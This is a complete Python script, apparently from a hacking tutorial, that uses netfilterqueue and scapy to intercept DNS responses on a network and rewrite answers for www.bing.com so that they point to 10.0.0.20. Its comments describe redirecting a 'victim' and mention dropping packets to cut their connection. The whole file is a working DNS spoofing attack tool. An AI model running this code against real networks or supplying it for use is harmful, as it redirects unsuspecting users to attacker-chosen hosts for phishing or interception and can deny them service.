#!/usr/bin/env python

import netfilterqueue
# module that allow to access the queue from python
import scapy.all as scapy


def process_packet(packet):
    # get_payload() is a method that shows the actual content of the packet itself
    scapy_packet = scapy.IP(packet.get_payload())
    # check if the packet has a DNS response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # check if that DNS response is a response to a website that
        # that we want to spoof the target
        if "www.bing.com" in qname:
            print("spoofing target ")
            # using scapy to create a DNS response
            # (rrname) which is the name of website that the user requested
            # (rdata)contains the IP that is sent as a response whenever
            # a DNS request is sent ( or want to redirect the victim to )
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.0.20")
            scapy_packet[scapy.DNS].an = answer
            # modifying the number of responses to one respond
            scapy_packet[scapy.DNS].ancount = 1
            # ( len ) the lenght of the layer
            del scapy_packet[scapy.IP].len
            # ( chksum ) to insure that the packet hasn't been modified
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            # str to be able to access the fields of the packet nicely
            packet.set_payload(str(scapy_packet))

    # forwarding packets to its destination
    packet.accept()
    # or dropping the packets (cutting internet connection)
    # packet.drop()


queue = netfilterqueue.NetfilterQueue()
# creating an instance of the netfilterqueue object and storing it in a variable called queue
queue.bind(0, process_packet)
# connect or bind this queue with the queue created previously
# (in the terminal , and we gonna create it here using subprocess module
# ( 0 ) is the queue number , ( process_packet ) is the call back function which
# is gonna be executed
queue.run()

